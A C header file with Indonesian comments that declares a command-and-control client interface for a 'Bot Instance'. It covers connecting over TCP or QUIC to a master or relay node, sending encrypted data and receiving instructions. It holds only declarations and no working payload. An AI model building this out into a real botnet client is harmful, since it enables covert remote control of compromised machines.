/**
 * @file c2_client.h
 * @brief Definisi interface koneksi C2 (Command & Control) berbasis TCP/QUIC untuk Bot Instance.
 */

#ifndef C2_CLIENT_H
#define C2_CLIENT_H

#include <stdint.h>
#include <stdbool.h>
#include <sys/types.h>

#define C2_DEFAULT_PORT 8443
#define C2_RECONNECT_DELAY_SEC 5
#define MAX_BUFFER_SIZE 4096

typedef enum {
    C2_PROTOCOL_TCP = 0,
    C2_PROTOCOL_QUIC = 1
} c2_protocol_t;

typedef struct {
    int socket_fd;
    char server_ip[64];
    uint16_t port;
    c2_protocol_t proto;
    bool is_connected;
    uint32_t reconnect_attempts;
} c2_client_t;

/**
 * @brief Menginisialisasi struktur client C2.
 * @param client Pointer ke struktur c2_client_t.
 * @param server_ip Alamat IP Master atau Relay Node.
 * @param port Port layanan C2.
 * @param proto Jenis protokol (TCP atau QUIC).
 * @return int 0 jika sukses, -1 jika gagal.
 */
int c2_client_init(c2_client_t *client, const char *server_ip, uint16_t port, c2_protocol_t proto);

/**
 * @brief Membuka koneksi ke C2 server.
 * @param client Pointer ke c2_client_t.
 * @return int 0 jika terhubung, -1 jika gagal.
 */
int c2_client_connect(c2_client_t *client);

/**
 * @brief Mengirim data terenkripsi ke C2 server.
 * @param client Pointer ke c2_client_t.
 * @param data Buffer data yang akan dikirim.
 * @param len Panjang data dalam byte.
 * @return ssize_t Jumlah byte yang dikirim atau -1 jika error.
 */
ssize_t c2_client_send(c2_client_t *client, const uint8_t *data, size_t len);

/**
 * @brief Menerima instruksi/pesan dari C2 server.
 * @param client Pointer ke c2_client_t.
 * @param buffer Buffer penampung data masuk.
 * @param max_len Ukuran maksimum buffer.
 * @return ssize_t Jumlah byte yang diterima atau -1 jika error.
 */
ssize_t c2_client_receive(c2_client_t *client, uint8_t *buffer, size_t max_len);

/**
 * @brief Menutup koneksi dan membersihkan resource client.
 * @param client Pointer ke c2_client_t.
 */
void c2_client_destroy(c2_client_t *client);

#endif // C2_CLIENT_H

